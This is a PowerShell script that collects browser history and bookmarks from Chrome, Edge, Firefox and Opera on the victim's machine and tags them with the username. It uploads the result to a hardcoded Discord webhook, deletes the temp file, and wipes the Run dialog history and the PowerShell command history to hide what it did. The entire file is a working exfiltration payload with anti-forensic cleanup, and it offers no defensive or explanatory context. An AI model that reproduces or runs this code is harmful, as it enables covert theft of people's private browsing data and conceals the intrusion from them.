function Get-BrowserData {

    [CmdletBinding()]
    param (	
    [Parameter (Position=1,Mandatory = $True)]
    [string]$Browser,    
    [Parameter (Position=1,Mandatory = $True)]
    [string]$DataType 
    ) 

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"}
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}

    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
    $Value | ForEach-Object {
        $Key = $_
        if ($Key -match $Search){
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    }
}

Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\--BrowserData.txt

Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt

Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\--BrowserData.txt

Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt

Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\--BrowserData.txt

Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.txt

Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt

# Upload output file to Discord

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text
)

$hookurl = "https://discord.com/api/webhooks/1370438670624100382/U6QnOyMsmo8g8xbKALx-TLTdT5SMQ0F0UnPQOnKjQLFu42KRdEKw3UfaI79LaUAGdXin"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

Upload-Discord -file $env:TMP\--BrowserData.txt

# Clean up the temporary file
Remove-Item $env:TMP\--BrowserData.txt -Force -ErrorAction SilentlyContinue

# Clear Windows Run Dialog History (RunMRU)
try {
    $runMruPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
    if (Test-Path $runMruPath) {
        # Get all properties except MRUList and remove them individually
        $properties = Get-ItemProperty -Path $runMruPath | Get-Member -MemberType NoteProperty | Where-Object { $_.Name -ne "MRUList" }
        foreach ($prop in $properties) {
            Remove-ItemProperty -Path $runMruPath -Name $prop.Name -Force -ErrorAction SilentlyContinue
        }
        # Reset the MRUList to an empty value
        Set-ItemProperty -Path $runMruPath -Name "MRUList" -Value "" -Force -ErrorAction SilentlyContinue
    }
} catch {
    # Silently handle errors (likely due to permissions)
}

# Clear PowerShell Command History
try {
    $psHistoryPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $psHistoryPath) {
        # Overwrite the history file with an empty file to clear its contents
        Set-Content -Path $psHistoryPath -Value "" -Force -ErrorAction SilentlyContinue
        # Alternatively, delete the file if overwriting isn't possible
        if (Test-Path $psHistoryPath) {
            Remove-Item -Path $psHistoryPath -Force -ErrorAction SilentlyContinue
        }
    }
} catch {
    # Silently handle errors (likely due to permissions or file locks)
}
